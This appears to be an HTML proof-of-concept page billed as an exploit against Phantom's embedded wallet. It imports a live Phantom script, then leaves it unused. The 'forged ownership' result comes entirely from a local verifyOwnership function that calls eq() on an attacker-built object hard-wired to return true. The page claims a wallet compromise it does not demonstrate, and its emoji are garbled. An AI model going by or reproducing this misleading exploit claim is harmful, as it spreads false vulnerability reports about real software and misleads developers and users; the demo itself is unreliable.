<!doctype html>
<html>
  <head>
    <title>Phantom Module Exploit PoC</title>
  </head>
  <body>
    <h1>ğŸš¨ Phantom Embedded Wallet Exploit Demo</h1>
    <pre id="output"></pre>
    <script type="module">
      const output = document.getElementById("output");

      try {
        const mod = await import(
          "https://embedded-wallet.phantom.app/assets/metaplexMplTokenMetadata-B1auuVGR.js"
        );
        const codec = mod.p();

        const fakeBN = {
          eq: () => {
            output.innerText +=
              "\nğŸ”¥ EQ override triggered â€” attacker forged ownership!";
            return true;
          },
        };

        const attackerPublicKey = {
          _bn: fakeBN,
          toBuffer: () => new Uint8Array(32),
        };

        function verifyOwnership(inputPublicKey) {
          const legitKey = {
            _bn: {
              eq: () => {
                output.innerText += "\nâœ… Legit eq() check triggered.";
                return false;
              },
            },
          };

          if (inputPublicKey._bn.eq(legitKey._bn)) {
            output.innerText += "\nğŸ¯ Access granted to attacker!";
          } else {
            output.innerText += "\nğŸš« Access denied.";
          }
        }

        verifyOwnership(attackerPublicKey);
      } catch (err) {
        output.innerText = "âŒ Error loading module or running exploit: " + err;
      }
    </script>
  </body>
</html>
